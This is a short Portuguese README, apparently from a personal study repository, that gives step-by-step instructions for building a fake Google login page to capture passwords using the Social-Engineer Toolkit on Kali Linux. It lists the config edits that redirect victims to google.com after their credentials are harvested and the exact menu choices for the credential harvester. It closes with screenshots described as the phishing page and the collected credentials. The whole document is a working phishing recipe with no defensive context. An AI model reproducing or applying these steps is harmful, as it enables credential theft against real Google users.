# Phishing para captura de senhas do Google

### Ferramentas

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

- Acesso root: ``` sudo su ```
- Mudar permissão de arquivo: ``` chmod 744 /etc/setoolkit/set.config ```
- Alterar arquivo com nano: ``` nano +158 /etc/setoolkit/set.config ```
- Definir site para redirecionar após coleta: ``` HARVESTER_REDIRECT=ON HARVESTER_URL=http://google.com ```
- Salvar alterações: ```Ctrl + 0 e Press Enter```
- Sair do editor: ```Ctrl + X```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Web Templates ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- Selecionar template: ``` Google ```

### Resutados

- Página Phishing Google
  
![Alt text](./page.PNG "pagina phishing google")

- Credenciais Coletadoas

![Alt text](./passwd.png "credenciais coletadas")
